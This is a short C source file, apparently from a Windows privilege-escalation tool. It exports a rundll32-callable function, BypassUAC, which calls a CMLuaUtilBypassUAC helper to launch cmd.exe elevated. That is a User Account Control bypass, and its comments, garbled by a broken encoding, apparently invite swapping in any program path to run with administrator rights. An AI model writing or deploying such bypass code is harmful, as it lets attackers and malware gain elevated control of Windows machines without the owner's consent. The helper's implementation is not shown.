#include "BypassUAC.h"

//����������rundll32.exe����ִ��
void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(L"C:\\Windows\\System32\\cmd.exe"); //�ƹ�UAC��������,�����滻����Ҫ�����Ľ���·��
}